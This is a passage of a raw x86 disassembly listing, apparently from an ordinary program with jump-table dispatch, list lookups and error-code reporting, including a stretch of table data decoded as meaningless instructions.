  4027e0:	ja     0x402dd2
  4027e6:	movzx  eax,BYTE PTR [eax+0x402e24]
  4027ed:	jmp    DWORD PTR [eax*4+0x402e18]
  4027f4:	movzx  eax,cl
  4027f7:	dec    eax
  4027f8:	cmp    eax,0x19
  4027fb:	ja     0x402dd2
  402801:	movzx  eax,BYTE PTR [eax+0x402e80]
  402808:	jmp    DWORD PTR [eax*4+0x402e40]
  40280f:	call   0x4021f0
  402814:	mov    eax,0xffff
  402819:	mov    ds:0x40e8d8,ax
  40281f:	mov    BYTE PTR ds:0x40e411,0x0
  402826:	call   0x402500
  40282b:	mov    ds:0x40e411,al
  402830:	test   al,al
  402832:	je     0x40283c
  402834:	mov    edi,DWORD PTR ds:0x40e41c
  40283a:	jmp    0x402870
  40283c:	call   0x40b280
  402841:	mov    edi,eax
  402843:	mov    DWORD PTR ds:0x40e420,edi
  402849:	test   edi,edi
  40284b:	je     0x40285e
  40284d:	cmp    edi,DWORD PTR ds:0x40e41c
  402853:	jne    0x402876
  402855:	mov    BYTE PTR ds:0x40e411,0x1
  40285c:	jmp    0x402876
  40285e:	push   ecx
  40285f:	call   0x409820
  402864:	add    esp,0x4
  402867:	mov    ecx,eax
  402869:	call   0x40b440
  40286e:	mov    edi,eax
  402870:	mov    DWORD PTR ds:0x40e420,edi
  402876:	cmp    BYTE PTR ds:0x40e028,0x0
  40287d:	je     0x40288e
  40287f:	mov    BYTE PTR [edi+0xc],0x1
  402883:	mov    DWORD PTR [esp+0x1c],edi
  402887:	mov    BYTE PTR ds:0x40e028,0x0
  40288e:	mov    eax,DWORD PTR [esp+0xc]
  402892:	mov    edx,DWORD PTR [eax]
  402894:	test   edx,edx
  402896:	je     0x40289c
  402898:	mov    edx,DWORD PTR [edx]
  40289a:	jmp    0x40289e
  40289c:	xor    edx,edx
  40289e:	xor    ecx,ecx
  4028a0:	test   edx,edx
  4028a2:	jle    0x4028c0
  4028a4:	mov    eax,DWORD PTR [eax]
  4028a6:	mov    esi,DWORD PTR [edi]
  4028a8:	add    eax,0x4
  4028ab:	jmp    0x4028b0
  4028ad:	lea    ecx,[ecx+0x0]
  4028b0:	cmp    DWORD PTR [eax],esi
  4028b2:	je     0x4028bc
  4028b4:	inc    ecx
  4028b5:	add    eax,0x4
  4028b8:	cmp    ecx,edx
  4028ba:	jl     0x4028b0
  4028bc:	mov    eax,DWORD PTR [esp+0xc]
  4028c0:	cmp    ecx,edx
  4028c2:	jne    0x4028cd
  4028c4:	push   DWORD PTR [edi]
  4028c6:	mov    ecx,eax
  4028c8:	call   0x4060c0
  4028cd:	call   0x40a7f0
  4028d2:	mov    esi,DWORD PTR ds:0x40e420
  4028d8:	cmp    al,0xff
  4028da:	sete   bl
  4028dd:	cmp    WORD PTR [esi+0x10],0x0
  4028e2:	jne    0x402918
  4028e4:	cmp    BYTE PTR ds:0x40e427,0x0
  4028eb:	jne    0x40290f
  4028ed:	cmp    BYTE PTR [esi+0xc],0x0
  4028f1:	jne    0x402900
  4028f3:	cmp    BYTE PTR ds:0x40e8cd,0x8
  4028fa:	jne    0x402900
  4028fc:	xor    dl,dl
  4028fe:	jmp    0x402902
  402900:	mov    dl,0x1
  402902:	mov    ecx,esi
  402904:	call   0x404f60
  402909:	mov    esi,DWORD PTR ds:0x40e420
  40290f:	mov    eax,0x1
  402914:	mov    WORD PTR [esi+0x10],ax
  402918:	cmp    BYTE PTR [esi+0xd],0x0
  40291c:	je     0x402928
  40291e:	mov    eax,DWORD PTR [esp+0x10]
  402922:	mov    ax,WORD PTR [eax+0x2]
  402926:	jmp    0x402931
  402928:	mov    eax,0xffff
  40292d:	mov    BYTE PTR [esi+0xd],0x1
  402931:	mov    edi,DWORD PTR ds:0x414b08
  402937:	mov    ds:0x414b10,ax
  40293d:	test   edi,edi
  40293f:	je     0x4027a0
  402945:	cmp    WORD PTR [esi+0x10],0x2
  40294a:	jne    0x402969
  40294c:	xor    dl,dl
  40294e:	mov    ecx,esi
  402950:	call   0x404f60
  402955:	mov    eax,ds:0x40e420
  40295a:	mov    edi,DWORD PTR ds:0x414b08
  402960:	mov    ecx,0x3
  402965:	mov    WORD PTR [eax+0x10],cx
  402969:	mov    ecx,DWORD PTR [edi+0x2]
  40296c:	call   0x403430
  402971:	mov    esi,DWORD PTR ds:0x40e420
  402977:	mov    edi,eax
  402979:	mov    DWORD PTR ds:0x414b08,edi
  40297f:	mov    DWORD PTR ds:0x414b0c,esi
  402985:	jmp    0x4027a0
  40298a:	cmp    esi,DWORD PTR ds:0x40e41c
  402990:	jne    0x40299c
  402992:	xor    eax,eax
  402994:	mov    ds:0x40e8d8,ax
  40299a:	jmp    0x4029a2
  40299c:	mov    ax,ds:0x40e8d8
  4029a2:	movzx  ecx,WORD PTR [esi+0x1a]
  4029a6:	cmp    ax,cx
  4029a9:	jae    0x4029c5
  4029ab:	mov    eax,0xffff
  4029b0:	cmp    cx,ax
  4029b3:	je     0x402783
  4029b9:	lea    eax,[ecx+0x1]
  4029bc:	mov    WORD PTR [esi+0x1a],ax
  4029c0:	jmp    0x402783
  4029c5:	jbe    0x402783
  4029cb:	mov    WORD PTR [esi+0x1a],ax
  4029cf:	jmp    0x402783
  4029d4:	mov    cx,WORD PTR ds:0x40e8d0
  4029db:	mov    bl,cl
  4029dd:	shr    bl,0x5
  4029e0:	mov    eax,0xffdf
  4029e5:	and    cx,ax
  4029e8:	mov    al,ds:0x40e8cc
  4029ed:	and    bl,0x1
  4029f0:	cmp    BYTE PTR ds:0x40e426,0x0
  4029f7:	mov    WORD PTR ds:0x40e8d0,cx
  4029fe:	je     0x402a15
  402a00:	test   cl,0x1
  402a03:	je     0x402a0d
  402a05:	cmp    al,0x4
  402a07:	je     0x402783
  402a0d:	cmp    al,0x3
  402a0f:	je     0x402783
  402a15:	cmp    BYTE PTR ds:0x40e413,0x0
  402a1c:	je     0x402a26
  402a1e:	cmp    al,0x11
  402a20:	je     0x402783
  402a26:	cmp    BYTE PTR ds:0x40e412,0x0
  402a2d:	je     0x402a47
  402a2f:	mov    ecx,DWORD PTR ds:0x40e8d4
  402a35:	call   0x40c280
  402a3a:	test   al,al
  402a3c:	jne    0x402783
  402a42:	mov    al,ds:0x40e8cc
  402a47:	movzx  eax,al
  402a4a:	add    eax,0xfffffffc
  402a4d:	cmp    eax,0xd
  402a50:	ja     0x402aa3
  402a52:	movzx  eax,BYTE PTR [eax+0x402ea8]
  402a59:	jmp    DWORD PTR [eax*4+0x402e9c]
  402a60:	test   bl,bl
  402a62:	jne    0x402aa3
  402a64:	mov    eax,ds:0x40e8d4
  402a69:	cmp    WORD PTR [eax],0x3f
  402a6d:	je     0x402aa3
  402a6f:	cmp    WORD PTR ds:0x40eaf8,0x0
  402a77:	je     0x402aa3
  402a79:	push   0x40eaf8
  402a7e:	push   eax
  402a7f:	push   0x4010d8
  402a84:	push   0xffffffff
  402a86:	push   0x2004
  402a8b:	push   0x410af8
  402a90:	call   DWORD PTR ds:0x4244c0
  402a96:	add    esp,0x18
  402a99:	mov    DWORD PTR ds:0x40e8d4,0x410af8
  402aa3:	call   0x403980
  402aa8:	sub    esp,0x8
  402aab:	call   0x403500
  402ab0:	add    esp,0x8
  402ab3:	test   bl,bl
  402ab5:	jne    0x402b1e
  402ab7:	mov    ecx,eax
  402ab9:	call   0x4030c0
  402abe:	jmp    0x402783
  402ac3:	call   0x403980
  402ac8:	call   0x403590
  402acd:	mov    ecx,DWORD PTR ds:0x40e420
  402ad3:	mov    ds:0x414b08,eax
  402ad8:	mov    DWORD PTR ds:0x414b0c,ecx
  402ade:	test   eax,eax
  402ae0:	je     0x402af8
  402ae2:	mov    eax,DWORD PTR [eax+0x12]
  402ae5:	test   eax,eax
  402ae7:	je     0x402af8
  402ae9:	cmp    DWORD PTR [eax],0x0
  402aec:	mov    DWORD PTR ds:0x414b18,0xffffffff
  402af6:	jne    0x402b02
  402af8:	mov    DWORD PTR ds:0x414b18,0x0
  402b02:	call   0x403340
  402b07:	jmp    0x402783
  402b0c:	call   0x403980
  402b11:	call   0x403590
  402b16:	test   eax,eax
  402b18:	je     0x402783
  402b1e:	mov    ecx,eax
  402b20:	call   0x402f90
  402b25:	jmp    0x402783
  402b2a:	call   0x402250
  402b2f:	jmp    0x402783
  402b34:	inc    dx
  402b36:	mov    WORD PTR ds:0x40e428,dx
  402b3d:	jmp    0x402783
  402b42:	mov    eax,0xffff
  402b47:	add    dx,ax
  402b4a:	mov    WORD PTR ds:0x40e428,dx
  402b51:	jmp    0x402783
  402b56:	xor    esi,esi
  402b58:	test   edi,edi
  402b5a:	je     0x402b5f
  402b5c:	mov    esi,DWORD PTR [edi+0x2]
  402b5f:	call   0x4022a0
  402b64:	cmp    DWORD PTR ds:0x414b08,0x0
  402b6b:	je     0x402783
  402b71:	call   0x403980
  402b76:	mov    ecx,esi
  402b78:	call   0x403430
  402b7d:	mov    ds:0x414b08,eax
  402b82:	mov    eax,ds:0x40e420
  402b87:	mov    ds:0x414b0c,eax
  402b8c:	jmp    0x402783
  402b91:	sub    esp,0x8
  402b94:	call   0x40bfd0
  402b99:	add    esp,0x8
  402b9c:	cmp    WORD PTR ds:0x40e424,0x0
  402ba4:	push   eax
  402ba5:	jne    0x402bc6
  402ba7:	push   DWORD PTR ds:0x40e024
  402bad:	call   DWORD PTR ds:0x4244bc
  402bb3:	add    esp,0x8
  402bb6:	test   eax,eax
  402bb8:	jne    0x402bdd
  402bba:	mov    BYTE PTR ds:0x40e410,0x1
  402bc1:	jmp    0x402783
  402bc6:	push   DWORD PTR ds:0x40e8dc
  402bcc:	call   DWORD PTR ds:0x4244bc
  402bd2:	add    esp,0x8
  402bd5:	test   eax,eax
  402bd7:	je     0x402de4
  402bdd:	inc    WORD PTR ds:0x40e424
  402be4:	call   0x402250
  402be9:	call   0x4021f0
  402bee:	mov    eax,ds:0x40e41c
  402bf3:	sub    esp,0x8
  402bf6:	mov    ds:0x40e420,eax
  402bfb:	mov    BYTE PTR ds:0x40e411,0x1
  402c02:	mov    DWORD PTR ds:0x414b08,0x0
  402c0c:	mov    DWORD PTR ds:0x414b0c,0x0
  402c16:	call   0x40bfd0
  402c1b:	add    esp,0x8
  402c1e:	mov    ecx,eax
  402c20:	call   0x40ad80
  402c25:	call   0x4076f0
  402c2a:	test   al,al
  402c2c:	jne    0x402783
  402c32:	pop    edi
  402c33:	pop    esi
  402c34:	pop    ebx
  402c35:	mov    esp,ebp
  402c37:	pop    ebp
  402c38:	ret    
  402c39:	mov    ax,ds:0x40e424
  402c3f:	cmp    ax,0x1
  402c43:	ja     0x402c50
  402c45:	call   0x4037e0
  402c4a:	mov    ax,ds:0x40e424
  402c50:	test   ax,ax
  402c53:	je     0x402c98
  402c55:	mov    ecx,0xffff
  402c5a:	add    ax,cx
  402c5d:	mov    ds:0x40e424,ax
  402c63:	mov    eax,ds:0x414b00
  402c68:	test   eax,eax
  402c6a:	je     0x402c71
  402c6c:	cmp    DWORD PTR [eax],0x0
  402c6f:	je     0x402c89
  402c71:	call   0x4022a0
  402c76:	mov    eax,ds:0x414b00
  402c7b:	test   eax,eax
  402c7d:	je     0x402c89
  402c7f:	cmp    DWORD PTR [eax],0x0
  402c82:	je     0x402c89
  402c84:	call   0x4022a0
  402c89:	call   0x40af90
  402c8e:	call   0x402330
  402c93:	jmp    0x402783
  402c98:	mov    ecx,DWORD PTR ds:0x40e8dc
  402c9e:	call   0x40b9d0
  402ca3:	test   eax,eax
  402ca5:	je     0x402783
  402cab:	or     WORD PTR [eax],0x8
  402caf:	jmp    0x402783
  402cb4:	call   0x403980
  402cb9:	call   0x403590
  402cbe:	mov    esi,eax
  402cc0:	test   esi,esi
  402cc2:	je     0x402783
  402cc8:	mov    ecx,esi
  402cca:	call   0x403170
  402ccf:	mov    ecx,esi
  402cd1:	call   0x402f90
  402cd6:	jmp    0x402783
  402cdb:	xor    eax,eax
  402cdd:	mov    ds:0x40e428,ax
  402ce3:	cmp    DWORD PTR ds:0x414b04,eax
  402ce9:	je     0x402cfe
  402ceb:	jmp    0x402cf0
  402ced:	lea    ecx,[ecx+0x0]
  402cf0:	call   0x402330
  402cf5:	cmp    DWORD PTR ds:0x414b04,0x0
  402cfc:	jne    0x402cf0
  402cfe:	cmp    DWORD PTR ds:0x414b00,0x0
  402d05:	je     0x402d15
  402d07:	call   0x4022a0
  402d0c:	cmp    DWORD PTR ds:0x414b00,0x0
  402d13:	jne    0x402d07
  402d15:	call   0x40acc0
  402d1a:	pop    edi
  402d1b:	pop    esi
  402d1c:	pop    ebx
  402d1d:	mov    esp,ebp
  402d1f:	pop    ebp
  402d20:	ret    
  402d21:	mov    ebx,DWORD PTR [esp+0x14]
  402d25:	xor    edi,edi
  402d27:	test   ebx,ebx
  402d29:	jle    0x402d7e
  402d2b:	jmp    0x402d30
  402d2d:	lea    ecx,[ecx+0x0]
  402d30:	mov    eax,DWORD PTR [esp+0x18]
  402d34:	mov    esi,DWORD PTR [eax+edi*4]
  402d37:	push   esi
  402d38:	call   DWORD PTR ds:0x40e0a0
  402d3e:	movzx  eax,ax
  402d41:	cdq    
  402d42:	idiv   DWORD PTR ds:0x40e09c
  402d48:	mov    eax,ds:0x40e094
  402d4d:	add    esp,0x4
  402d50:	mov    eax,DWORD PTR [eax+edx*4]
  402d53:	test   eax,eax
  402d55:	je     0x402d79
  402d57:	cmp    DWORD PTR [eax+0x4],esi
  402d5a:	je     0x402d64
  402d5c:	mov    eax,DWORD PTR [eax]
  402d5e:	test   eax,eax
  402d60:	jne    0x402d57
  402d62:	jmp    0x402d79
  402d64:	mov    ecx,DWORD PTR [eax+0x8]
  402d67:	test   ecx,ecx
  402d69:	je     0x402d79
  402d6b:	cmp    WORD PTR [ecx+0x10],0x0
  402d70:	jne    0x402d79
  402d72:	xor    dl,dl
  402d74:	call   0x404f60
  402d79:	inc    edi
  402d7a:	cmp    edi,ebx
  402d7c:	jl     0x402d30
  402d7e:	push   DWORD PTR [esp+0x18]
  402d82:	call   DWORD PTR ds:0x42441c
  402d88:	add    esp,0x4
  402d8b:	call   0x4023c0
  402d90:	mov    esi,DWORD PTR [esp+0x1c]
  402d94:	test   esi,esi
  402d96:	je     0x402c32
  402d9c:	mov    ecx,esi
  402d9e:	call   0x4039b0
  402da3:	mov    eax,0x2
  402da8:	pop    edi
  402da9:	mov    WORD PTR [esi+0x10],ax
  402dad:	pop    esi
  402dae:	pop    ebx
  402daf:	mov    esp,ebp
  402db1:	pop    ebp
  402db2:	ret    
  402db3:	push   0x0
  402db5:	xor    edx,edx
  402db7:	mov    ecx,0x5dc
  402dbc:	call   0x407010
  402dc1:	push   0x0
  402dc3:	mov    edx,0x4010c0
  402dc8:	mov    ecx,0x5e5
  402dcd:	call   0x407010
  402dd2:	mov    edx,DWORD PTR ds:0x40e8dc
  402dd8:	push   0x0
  402dda:	mov    ecx,0x5e6
  402ddf:	call   0x407010
  402de4:	mov    edx,DWORD PTR ds:0x40e8dc
  402dea:	push   0x0
  402dec:	mov    ecx,0x5ed
  402df1:	call   0x407010
  402df6:	call   0x407400
  402dfb:	push   0x0
  402dfd:	mov    edx,0x4010c0
  402e02:	mov    ecx,0x5e5
  402e07:	mov    DWORD PTR ds:0x40e418,0x0
  402e11:	call   0x407010
  402e16:	mov    edi,edi
  402e18:	hlt    
  402e19:	daa    
  402e1a:	inc    eax
  402e1b:	add    BYTE PTR [ebx-0x2dffbfd9],al
  402e21:	sub    eax,0x1000040
  402e26:	add    DWORD PTR [ecx],eax
  402e28:	add    DWORD PTR [ecx],eax
  402e2a:	add    DWORD PTR [ecx],eax
  402e2c:	add    DWORD PTR [eax],eax
  402e2e:	add    DWORD PTR [ecx],eax
  402e30:	add    DWORD PTR [eax],eax
  402e32:	add    BYTE PTR [eax],al
  402e34:	add    al,BYTE PTR [edx]
  402e36:	add    al,BYTE PTR [edx]
  402e38:	add    al,BYTE PTR [eax]
  402e3a:	add    al,BYTE PTR [edx]
  402e3c:	add    al,BYTE PTR [ecx]
  402e3e:	mov    edi,edi
  402e40:	movaps xmm0,XMMWORD PTR [eax+0x0]
  402e44:	mov    ch,BYTE PTR [ecx]
  402e46:	inc    eax
  402e47:	add    ah,dl
  402e49:	sub    DWORD PTR [eax+0x0],eax
  402e4c:	or     al,0x2b
  402e4e:	inc    eax
  402e4f:	add    BYTE PTR [ebx+ebp*1],dh
  402e52:	inc    eax
  402e53:	add    BYTE PTR [edx+0x2b],al
  402e56:	inc    eax
  402e57:	add    BYTE PTR [edx],ch
  402e59:	sub    eax,DWORD PTR [eax+0x0]
  402e5c:	mov    gs,WORD PTR [eax+eax*2]
  402e5f:	add    BYTE PTR [esi+0x2b],dl
  402e62:	inc    eax
  402e63:	add    bl,al
  402e65:	sub    al,BYTE PTR [eax+0x0]
  402e68:	mov    ah,0x2c
  402e6a:	inc    eax
  402e6b:	add    BYTE PTR [ebx-0x24ffbfd9],al
  402e71:	sub    al,0x40
  402e73:	add    BYTE PTR [ecx+0x3900402b],dl
  402e79:	sub    al,0x40
  402e7b:	add    dl,dl
  402e7d:	sub    eax,0x1000040
  402e82:	add    al,BYTE PTR [ebx]
  402e84:	add    eax,DWORD PTR [eax*1+0x9080706]
  402e8b:	or     cl,BYTE PTR [ebx]
  402e8d:	or     al,0xd
  402e8f:	push   cs
  402e90:	(bad)  
  402e91:	(bad)  
  402e92:	pi2fw  mm1,QWORD PTR [edi]
  402e96:	(bad)  
  402e97:	(bad)  
  402e98:	sidtd  [ebx+0x402a64ff]
  402e9f:	add    BYTE PTR [eax+0x2a],ah
  402ea2:	inc    eax
  402ea3:	add    BYTE PTR [ebx+0x402a],ah
  402ea9:	add    al,BYTE PTR [edx]
  402eab:	add    al,BYTE PTR [ecx]
  402ead:	add    BYTE PTR [edx],al
  402eaf:	add    DWORD PTR [edx],eax
  402eb1:	add    al,BYTE PTR [edx]
  402eb3:	add    DWORD PTR [eax],eax
  402eb5:	add    ah,cl
  402eb7:	int3   
  402eb8:	int3   
  402eb9:	int3   
  402eba:	int3   
  402ebb:	int3   
  402ebc:	int3   
  402ebd:	int3   
  402ebe:	int3   
  402ebf:	int3   
  402ec0:	push   ebp
  402ec1:	mov    ebp,esp
  402ec3:	push   ecx
  402ec4:	push   ebx
  402ec5:	push   esi
  402ec6:	mov    esi,DWORD PTR ds:0x414b08
  402ecc:	push   edi
  402ecd:	mov    edi,ecx
  402ecf:	mov    ebx,0x1
  402ed4:	mov    eax,DWORD PTR [edi+0x2]
  402ed7:	add    esi,0x12
  402eda:	mov    ecx,DWORD PTR [eax]
  402edc:	and    ecx,0x1f
  402edf:	shl    ebx,cl
  402ee1:	mov    DWORD PTR [ebp-0x4],esi
  402ee4:	test   DWORD PTR ds:0x414b18,ebx
  402eea:	je     0x402f0e
  402eec:	mov    edx,DWORD PTR [esi]
  402eee:	test   edx,edx
  402ef0:	je     0x402ef6
  402ef2:	mov    eax,DWORD PTR [edx]
  402ef4:	jmp    0x402ef8
  402ef6:	xor    eax,eax
  402ef8:	dec    eax
  402ef9:	js     0x402f0e
  402efb:	lea    ecx,[eax+0x1]
  402efe:	lea    ecx,[eax+ecx*2]
  402f01:	lea    ecx,[edx+ecx*2]
  402f04:	cmp    DWORD PTR [ecx],edi
  402f06:	je     0x402f83
  402f08:	sub    ecx,0x6
  402f0b:	dec    eax
  402f0c:	jns    0x402f04
  402f0e:	mov    si,WORD PTR ds:0x414b10
  402f15:	mov    ecx,DWORD PTR [ebp-0x4]
  402f18:	sub    esp,0x8
  402f1b:	mov    eax,esp
  402f1d:	mov    DWORD PTR [eax],edi
  402f1f:	mov    WORD PTR [eax+0x4],si
  402f23:	call   0x405ef0
  402f28:	mov    eax,ds:0x414b08
  402f2d:	or     DWORD PTR ds:0x414b18,ebx
  402f33:	sub    esp,0x8
  402f36:	mov    ecx,esp
  402f38:	mov    DWORD PTR [ecx],eax
  402f3a:	mov    WORD PTR [ecx+0x4],si
  402f3e:	lea    ecx,[edi+0x16]
  402f41:	call   0x405ef0
  402f46:	mov    eax,ds:0x40e420
  402f4b:	mov    dx,WORD PTR ds:0x414b10
  402f52:	inc    WORD PTR [eax+0x8]
  402f56:	mov    esi,0xffff
  402f5b:	cmp    dx,si
  402f5e:	je     0x402f83
  402f60:	cmp    BYTE PTR [eax+0xf],0x0
  402f64:	je     0x402f83
  402f66:	movzx  ecx,WORD PTR [eax+0x1c]
  402f6a:	cmp    cx,dx
  402f6d:	je     0x402f83
  402f6f:	cmp    cx,si
  402f72:	jne    0x402f7f
  402f74:	mov    WORD PTR [eax+0x1c],dx
  402f78:	pop    edi
  402f79:	pop    esi
  402f7a:	pop    ebx
  402f7b:	mov    esp,ebp
  402f7d:	pop    ebp
  402f7e:	ret    
  402f7f:	mov    BYTE PTR [eax+0xf],0x0
  402f83:	pop    edi
  402f84:	pop    esi
  402f85:	pop    ebx
  402f86:	mov    esp,ebp
  402f88:	pop    ebp
  402f89:	ret    
  402f8a:	int3   
  402f8b:	int3   
  402f8c:	int3   
  402f8d:	int3   
  402f8e:	int3   
  402f8f:	int3   
  402f90:	push   ebp
  402f91:	mov    ebp,esp
  402f93:	sub    esp,0xc
  402f96:	push   ebx
  402f97:	push   esi
  402f98:	lea    ebx,[ecx+0xe]
  402f9b:	push   edi
  402f9c:	mov    edi,DWORD PTR [ebx]
  402f9e:	mov    DWORD PTR [ebp-0x4],ecx
  402fa1:	test   edi,edi
  402fa3:	je     0x402fa9
  402fa5:	mov    eax,DWORD PTR [edi]
  402fa7:	jmp    0x402fab
  402fa9:	xor    eax,eax
  402fab:	mov    esi,DWORD PTR ds:0x40e420
  402fb1:	mov    edx,0xffff
  402fb6:	cmp    WORD PTR [esi+0x4],dx
  402fba:	jne    0x403007
  402fbc:	cmp    BYTE PTR [esi+0xe],0x0
  402fc0:	jne    0x4030a2
  402fc6:	mov    ecx,DWORD PTR ds:0x40e430
  402fcc:	lea    edx,[ebp-0x8]
  402fcf:	mov    eax,DWORD PTR [ecx]
  402fd1:	push   edx
  402fd2:	push   DWORD PTR [esi]
  402fd4:	call   DWORD PTR [eax+0x38]
  402fd7:	test   eax,eax
  402fd9:	je     0x4030a9
  402fdf:	movzx  eax,WORD PTR ds:0x40e8d8
  402fe6:	push   eax
  402fe7:	push   DWORD PTR [ebp-0x8]
  402fea:	push   0x1198
  402fef:	call   0x407350
  402ff4:	mov    eax,ds:0x40e420
  402ff9:	add    esp,0xc
  402ffc:	mov    BYTE PTR [eax+0xe],0x1
  403000:	pop    edi
  403001:	pop    esi
  403002:	pop    ebx
  403003:	mov    esp,ebp
  403005:	pop    ebp
  403006:	ret    
  403007:	mov    dx,WORD PTR ds:0x40e8d8
  40300e:	cmp    WORD PTR [esi+0x1a],dx
  403012:	jne    0x403020
  403014:	test   eax,eax
  403016:	je     0x403041
  403018:	cmp    WORD PTR [edi+eax*4],dx
  40301c:	je     0x403094
  40301e:	jmp    0x403041
  403020:	dec    eax
  403021:	js     0x403041
  403023:	lea    ecx,[edi+0x4]
  403026:	lea    ecx,[ecx+eax*4]
  403029:	lea    esp,[esp+0x0]
  403030:	cmp    WORD PTR [ecx],dx
  403033:	je     0x40303d
  403035:	sub    ecx,0x4
  403038:	dec    eax
  403039:	jns    0x403030
  40303b:	jmp    0x403041
  40303d:	test   eax,eax
  40303f:	jns    0x403091
  403041:	mov    ax,ds:0x414b10
  403047:	mov    WORD PTR [ebp-0x8],dx
  40304b:	mov    WORD PTR [ebp-0x6],ax
  40304f:	push   DWORD PTR [ebp-0x8]
  403052:	mov    ecx,ebx
  403054:	call   0x405e00
  403059:	mov    eax,ds:0x40e420
  40305e:	mov    cx,WORD PTR ds:0x414b10
  403065:	inc    WORD PTR [eax+0x4]
  403069:	mov    esi,0xffff
  40306e:	cmp    cx,si
  403071:	je     0x403091
  403073:	cmp    BYTE PTR [eax+0xf],0x0
  403077:	je     0x403091
  403079:	movzx  edx,WORD PTR [eax+0x1c]
  40307d:	cmp    dx,cx
  403080:	je     0x403091
  403082:	cmp    dx,si
  403085:	jne    0x40308d
  403087:	mov    WORD PTR [eax+0x1c],cx
  40308b:	jmp    0x403091
  40308d:	mov    BYTE PTR [eax+0xf],0x0
  403091:	mov    ecx,DWORD PTR [ebp-0x4]
  403094:	cmp    DWORD PTR ds:0x414b08,0x0
  40309b:	je     0x4030a2
  40309d:	call   0x402ec0
  4030a2:	pop    edi
  4030a3:	pop    esi
  4030a4:	pop    ebx
  4030a5:	mov    esp,ebp
  4030a7:	pop    ebp
  4030a8:	ret    
  4030a9:	push   0x0
  4030ab:	mov    edx,0x4010c0
  4030b0:	mov    ecx,0x5e5
  4030b5:	call   0x407010
  4030ba:	int3   
  4030bb:	int3   
  4030bc:	int3   
  4030bd:	int3   
  4030be:	int3   
  4030bf:	int3   
  4030c0:	push   ebp
  4030c1:	mov    ebp,esp
  4030c3:	push   ecx
  4030c4:	push   ebx
  4030c5:	push   esi
  4030c6:	push   edi
  4030c7:	mov    edi,ecx
  4030c9:	mov    esi,DWORD PTR [edi+0xa]
  4030cc:	test   esi,esi
  4030ce:	je     0x4030d4
  4030d0:	mov    eax,DWORD PTR [esi]
  4030d2:	jmp    0x4030d6
  4030d4:	xor    eax,eax
  4030d6:	dec    eax
  4030d7:	mov    dx,WORD PTR ds:0x40e8d8
  4030de:	js     0x4030f7
  4030e0:	lea    ecx,[esi+0x4]
  4030e3:	lea    ecx,[ecx+eax*4]
  4030e6:	cmp    WORD PTR [ecx],dx
  4030e9:	je     0x4030f3
  4030eb:	sub    ecx,0x4
  4030ee:	dec    eax
  4030ef:	jns    0x4030e6
  4030f1:	jmp    0x4030f7
  4030f3:	test   eax,eax
  4030f5:	jns    0x403148
  4030f7:	mov    ax,ds:0x414b10
  4030fd:	mov    WORD PTR [ebp-0x4],dx
  403101:	mov    WORD PTR [ebp-0x2],ax
  403105:	push   DWORD PTR [ebp-0x4]
  403108:	lea    ecx,[edi+0xa]
  40310b:	call   0x405d10
  403110:	mov    eax,ds:0x40e420
  403115:	mov    cx,WORD PTR ds:0x414b10
  40311c:	inc    WORD PTR [eax+0x6]
  403120:	mov    esi,0xffff
  403125:	cmp    cx,si
  403128:	je     0x403148
  40312a:	cmp    BYTE PTR [eax+0xf],0x0
  40312e:	je     0x403148
  403130:	movzx  edx,WORD PTR [eax+0x1c]
  403134:	cmp    dx,cx
  403137:	je     0x403148
  403139:	cmp    dx,si
  40313c:	jne    0x403144
  40313e:	mov    WORD PTR [eax+0x1c],cx
  403142:	jmp    0x403148
  403144:	mov    BYTE PTR [eax+0xf],0x0
  403148:	mov    eax,ds:0x414b08
  40314d:	test   eax,eax
  40314f:	je     0x40315c
  403151:	cmp    edi,eax
  403153:	je     0x40315c
  403155:	mov    ecx,edi
  403157:	call   0x402ec0
  40315c:	pop    edi
  40315d:	pop    esi
  40315e:	pop    ebx
  40315f:	mov    esp,ebp
  403161:	pop    ebp
  403162:	ret    
  403163:	int3   
  403164:	int3   
  403165:	int3   
  403166:	int3   
  403167:	int3   
  403168:	int3   
  403169:	int3   
  40316a:	int3   
  40316b:	int3   
  40316c:	int3   
  40316d:	int3   
  40316e:	int3   
  40316f:	int3   
  403170:	push   ebp
  403171:	mov    ebp,esp
  403173:	mov    edx,DWORD PTR ds:0x414b08
  403179:	sub    esp,0xc
  40317c:	push   ebx
  40317d:	push   esi
  40317e:	push   edi
  40317f:	mov    edi,ecx
  403181:	test   edx,edx
  403183:	je     0x40332c
  403189:	cmp    DWORD PTR [edx+0x6],0x0
  40318d:	jne    0x4031fa
  40318f:	mov    ecx,DWORD PTR ds:0x420398
  403195:	test   ecx,ecx
  403197:	je     0x4031a9
  403199:	mov    eax,DWORD PTR [ecx]
  40319b:	mov    ds:0x420398,eax
  4031a0:	xor    eax,eax
  4031a2:	mov    DWORD PTR [ecx],eax
  4031a4:	mov    DWORD PTR [ecx+0x4],eax
  4031a7:	jmp    0x4031f7
  4031a9:	mov    eax,ds:0x422bb0
  4031ae:	cmp    eax,0x8
  4031b1:	jge    0x4031de
  4031b3:	cmp    eax,0x4
  4031b6:	jb     0x4031c5
  4031b8:	mov    ecx,DWORD PTR ds:0x422bac
  4031be:	mov    edx,eax
  4031c0:	call   0x40ca10
  4031c5:	mov    ecx,0x200
  4031ca:	call   0x40c940
  4031cf:	mov    edx,DWORD PTR ds:0x414b08
  4031d5:	mov    esi,eax
  4031d7:	mov    eax,0x200
  4031dc:	jmp    0x4031e4
  4031de:	mov    esi,DWORD PTR ds:0x422bac
  4031e4:	sub    eax,0x8
  4031e7:	mov    ecx,esi
  4031e9:	add    esi,0x8
  4031ec:	mov    ds:0x422bb0,eax
  4031f1:	mov    DWORD PTR ds:0x422bac,esi
  4031f7:	mov    DWORD PTR [edx+0x6],ecx
  4031fa:	mov    esi,DWORD PTR [edx+0x6]
  4031fd:	mov    edx,DWORD PTR [esi]
  4031ff:	test   edx,edx
  403201:	je     0x403207
  403203:	mov    ecx,DWORD PTR [edx]
  403205:	jmp    0x403209
  403207:	xor    ecx,ecx
  403209:	dec    ecx
  40320a:	js     0x403234
  40320c:	lea    eax,[ecx*8+0x0]
  403213:	sub    eax,ecx
  403215:	add    eax,0x4
  403218:	add    eax,edx
  40321a:	lea    ebx,[ebx+0x0]
  403220:	cmp    DWORD PTR [eax],edi
  403222:	je     0x40322c
  403224:	sub    eax,0x7
  403227:	dec    ecx
  403228:	jns    0x403220
  40322a:	jmp    0x403234
  40322c:	test   ecx,ecx
  40322e:	jns    0x40332c
  403234:	mov    ax,ds:0x414b10
  40323a:	mov    WORD PTR [ebp-0x3],ax
  40323e:	mov    al,ds:0x40e8cc
  403243:	mov    cl,BYTE PTR [ebp-0x2]
  403246:	mov    BYTE PTR [ebp-0x4],al
